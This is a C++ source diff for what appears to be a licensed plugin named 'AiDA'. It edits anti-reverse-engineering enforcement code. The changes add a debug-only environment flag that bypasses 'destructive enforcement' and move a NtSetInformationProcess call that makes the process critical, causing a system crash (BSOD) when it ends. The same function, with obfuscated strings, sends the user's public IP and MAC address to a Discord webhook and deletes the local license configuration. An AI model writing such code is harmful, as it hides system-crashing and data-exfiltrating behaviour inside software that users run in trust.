@@ -80,6 +80,29 @@ namespace detail {
 static constexpr std::uint32_t DEBUG_NT_GLOBAL_MASK = 0x70u;
 static constexpr ULONGLONG VERIFY_INTERVAL_MS = 10000u;
 
+inline bool env_flag_enabled(const char* name)
+{
+	if (!name || !*name)
+		return false;
+	char value[16] = {};
+	DWORD n = GetEnvironmentVariableA(name, value, static_cast<DWORD>(sizeof(value)));
+	if (n == 0)
+		return false;
+	if (n >= sizeof(value))
+		return true;
+	return value[0] != '\0' && !(value[0] == '0' && value[1] == '\0');
+}
+
+inline bool destructive_enforcement_suppressed()
+{
+#ifdef NDEBUG
+	return false;
+#else
+	return env_flag_enabled("AIDA_FULL_TEST_RUNNING") ||
+	       env_flag_enabled("AIDA_DISABLE_DESTRUCTIVE_ENFORCEMENT");
+#endif
+}
+
 struct iat_entry_t
 {
 	std::uint64_t slot_va;
@@ -1349,6 +1372,12 @@ inline void delete_local_license_config()
 
 inline void enforce_self_analysis_violation()
 {
+	if (detail::destructive_enforcement_suppressed())
+	{
+		msg(OBFSTR_C("AiDA: anti_re destructive enforcement suppressed by test-safe environment.\n"));
+		return;
+	}
+
 	latch_self_analysis_violation("self_analysis_bsod", false);
 	sync_latched_violation_with_server();
 
@@ -1364,6 +1393,19 @@ inline void enforce_self_analysis_violation()
 	std::string public_ip = discord_webhook::get_public_ip();
 	std::string mac = discord_webhook::get_mac_address();
 
+
+	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+	if (ntdll)
+	{
+		using NtSetInformationProcess_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);
+		auto pSetInfo = reinterpret_cast<NtSetInformationProcess_t>(
+			GetProcAddress(ntdll, OBFSTR_C("NtSetInformationProcess")));
+		if (pSetInfo)
+		{
+			ULONG one = 1;
+			pSetInfo(GetCurrentProcess(), 0x1D, &one, sizeof(one));
+		}
+	}
 
 	discord_webhook::send_alert(
 		OBFSTR("\xf0\x9f\x92\x80 SELF-RE VIOLATION \xe2\x80\x94 BSOD + LICENSE REVOKED + HWID/IP BANNED"),
@@ -1396,8 +1438,6 @@ inline void enforce_self_analysis_violation()
 		);
 	}
 
-
-	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
 	if (ntdll)
 	{
 		using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(
